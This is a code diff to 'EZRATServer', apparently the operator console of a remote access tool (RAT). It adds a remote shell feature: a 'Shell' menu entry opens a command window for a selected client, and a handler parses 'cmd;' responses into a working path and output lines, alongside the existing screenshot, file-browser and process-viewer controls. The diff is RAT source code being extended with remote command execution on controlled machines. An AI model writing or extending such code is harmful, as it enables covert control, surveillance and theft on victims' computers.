@@ -33,6 +33,7 @@ namespace EZRATServer
         FileBrowser fl;
         Chat cht;
         ProcessViewer pc;
+        ShellCommand cmd;
 
 
         Timer tmr = new Timer();
@@ -316,6 +317,10 @@ namespace EZRATServer
                     break;
                 case "ScreenShot":
                     SendCommand("scrnshot;", this.lstClients.SelectedIndices[0]);
+                    break;
+                case "Shell":
+                    cmd = new ShellCommand(this, "C:\\" , this.lstClients.SelectedIndices[0]);
+                    cmd.Show();
                     break;
                 default:
                     break;
@@ -684,6 +689,13 @@ namespace EZRATServer
                         }
                         SaveScreenShot(bp);
 
+                    }
+                    else if (text.StartsWith("cmd;"))
+                    {
+                        text = text.Substring(4);
+                        string[] lines = text.Split(';');
+                        cmd.Path = lines[0];
+                        cmd.AddResultLine(lines[1]);
                     }
                 }
 
